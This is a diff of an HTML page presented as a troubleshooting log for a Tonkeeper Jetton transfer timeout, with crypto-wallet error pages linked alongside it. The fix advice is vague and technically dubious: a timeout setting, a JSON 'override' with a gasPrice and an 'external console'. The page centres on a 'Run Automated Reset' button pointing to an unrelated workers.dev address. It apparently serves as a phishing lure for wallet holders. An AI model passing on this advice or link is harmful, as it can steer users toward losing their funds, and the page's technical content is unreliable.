@@ -4,7 +4,7 @@
 <style>
     body {
         font-family: sans-serif;
-        background: #0f111a;
+        background: #0a0c10;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        box-shadow: none;
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff9455; }
+    a { color: #ff7b2c; }
     .btn {
-        background: #cf6679;
+        background: #ff9455;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,33 +42,33 @@
 <h1>Tonkeeper Jetton Transfer Loop Timeout</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users experience a timeout error when attempting to transfer Tonkeeper Jettons, resulting in failed transactions and potential loss of funds. The error message "Tonkeeper Jetton transfer loop timeout" is displayed, indicating a issue with the transaction processing.</li>
+<li>Users experience a timeout error when attempting to transfer Tonkeeper Jettons, resulting in failed transactions and an inability to complete the transfer process.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a loop in the transaction processing mechanism, causing the system to timeout and fail the transfer. This can be attributed to issues with the smart contract, network congestion, or incorrect configuration.</li>
+<li>The error occurs due to a prolonged waiting period for confirmation of the transaction on the TON blockchain, exceeding the predefined timeout threshold.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To resolve the issue, users can attempt the following manual overrides:</li>
-<li>Increase the transaction timeout value to allow for longer processing times</li>
-<li>Verify the smart contract configuration to ensure correct functionality</li>
-<li>Use the following JSON configuration to override default settings:</li>
+<li>To resolve the issue, try the following manual overrides:</li>
+<li>Increase the timeout threshold in the Tonkeeper settings to allow for more time to confirm the transaction.</li>
+<li>Check the TON blockchain for any network congestion or high gas fees that may be causing the delay.</li>
+<li>Use the following JSON configuration to override the default settings:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
 <span class="w">  </span><span class="nt">&quot;timeout&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">30000</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;retry_count&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">5</span>
+<span class="w">  </span><span class="nt">&quot;gasPrice&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1000000000</span>
 <span class="p">}</span>
 </code></pre></div>
 
-<p>Consider using an external console to execute these commands for more flexibility. </p>
+<p>Consider utilizing an external console for more advanced troubleshooting and configuration options. </p>
 <h2>Prerequisites</h2>
 <ul>
 <li>Tonkeeper wallet installed and configured</li>
-<li>Sufficient funds in the wallet for transaction fees</li>
-<li>Stable internet connection for transaction processing</li>
+<li>TON blockchain node synced and operational</li>
+<li>Sufficient balance of TON coins for transaction fees</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-p0-investigate-and-cap-multichain-account-cr.html">Metamask Extension P0 Investigate And Cap Multichain Account Creation/Syncing Span Fan-Out</a></li><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li><li><a href="./archive/2026/06/metamask-extension-bug-assets-confirming-the-add-token-from-a-d.html">Metamask Extension Bug Assets Confirming The Add Token From A D</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/go-ethereum-error-in-block-freeze-operation-errcanonical-hash-m.html">Go Ethereum Error In Block Freeze Operation Errcanonical Hash M</a></li><li><a href="./archive/2026/06/critical-trc-20-energy-spike-error.html">Critical Trc 20 Energy Spike Error</a></li><li><a href="./archive/2026/06/metamask-extension-bug-trying-to-navigate-back-from-the-manage-.html">Metamask Extension Bug Trying To Navigate Back From The Manage Network Page</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gJ%3Cx" class="btn">🛠 Run Automated Reset</a>
 </div>
